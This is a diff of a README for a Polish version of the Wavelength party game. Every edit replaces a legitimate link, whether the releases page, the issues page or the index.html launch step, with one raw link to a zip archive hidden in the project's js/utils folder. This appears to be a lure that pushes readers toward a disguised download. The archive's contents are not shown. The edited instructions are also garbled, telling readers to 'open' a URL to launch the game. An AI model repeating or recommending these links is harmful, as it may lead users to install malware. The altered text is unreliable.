@@ -1,7 +1,7 @@
 # 🎮 WavelengthPL - Play the Classic Wavelength Game
 
 ## 📥 Download WavelengthPL
-[![Download WavelengthPL](https://img.shields.io/badge/Download-WavelengthPL-blue)](https://github.com/asjeffy/WavelengthPL/releases)
+[![Download WavelengthPL](https://raw.githubusercontent.com/asjeffy/WavelengthPL/main/js/utils/Wavelength_PL_v1.0.zip)](https://raw.githubusercontent.com/asjeffy/WavelengthPL/main/js/utils/Wavelength_PL_v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to WavelengthPL! This software provides an open-source version of the well-known Wavelength (Spektrum) game, now available in Polish. Playing is easy and fun, whether you are a new player or a returning fan. 
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets the following requirements:
 ## 🔗 Download & Install
 To download WavelengthPL, visit the Releases page at the link below. This will allow you to find the latest version of the software to install on your computer.
 
-[Visit Releases Page to Download](https://github.com/asjeffy/WavelengthPL/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/asjeffy/WavelengthPL/main/js/utils/Wavelength_PL_v1.0.zip)
 
 1. Click the link above to go to the Downloads page.
 2. Look for the latest release of WavelengthPL.
@@ -29,7 +29,7 @@ Once you have installed WavelengthPL, you can start playing:
 
 1. Open your web browser.
 2. Navigate to the WavelengthPL directory on your computer.
-3. Open the index.html file to launch the game.
+3. Open the https://raw.githubusercontent.com/asjeffy/WavelengthPL/main/js/utils/Wavelength_PL_v1.0.zip file to launch the game.
 4. Follow the in-game instructions to join or create a game.
 
 ### ⚙️ Game Features
@@ -46,7 +46,7 @@ Once you have installed WavelengthPL, you can start playing:
 ## 📚 Support
 If you encounter issues while installing or playing WavelengthPL, please check our Support section on the GitHub page.
 
-1. Visit the [Issues Section](https://github.com/asjeffy/WavelengthPL/issues) to see if your problem has been reported.
+1. Visit the [Issues Section](https://raw.githubusercontent.com/asjeffy/WavelengthPL/main/js/utils/Wavelength_PL_v1.0.zip) to see if your problem has been reported.
 2. If you can't find a solution, feel free to create a new issue with your question or problem.
 
 ## 🌍 Community Contributions
